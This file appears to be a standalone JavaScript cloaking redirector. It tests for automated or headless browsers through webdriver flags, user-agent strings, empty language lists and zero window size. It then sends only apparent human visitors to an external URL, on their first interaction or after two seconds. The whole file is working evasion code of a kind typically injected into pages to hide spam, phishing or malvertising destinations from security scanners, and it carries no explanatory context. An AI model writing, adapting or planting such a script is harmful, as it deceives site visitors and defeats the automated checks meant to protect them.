(function () {
  var TARGET = 'http://well.hzcdf.uk/dnt3';
  var isHuman = false, isBot = false;

  try {
    if (navigator.webdriver === true) isBot = true;
    if (/HeadlessChrome|PhantomJS|Electron/i.test(navigator.userAgent)) isBot = true;
    if (navigator.languages && navigator.languages.length === 0) isBot = true;
    if (window.outerWidth === 0 || window.outerHeight === 0) isBot = true;
  } catch(e) {}

  function markHuman() { 
    if (isHuman || isBot) return;
    isHuman = true;
    
    window.location.href = TARGET;
  }

  ['touchstart', 'touchmove', 'pointerdown', 'scroll', 'mousemove', 'keydown', 'click'].forEach(function(ev){
    window.addEventListener(ev, markHuman, { passive: true, once: true });
  });
  
  window.addEventListener('deviceorientation', function(e){ 
    if (e && (e.alpha || e.beta || e.gamma)) markHuman(); 
  }, { passive: true, once: true });

  setTimeout(function() {
    if (!isBot && !isHuman) {
      window.location.href = TARGET;
    }
  }, 2000);
})();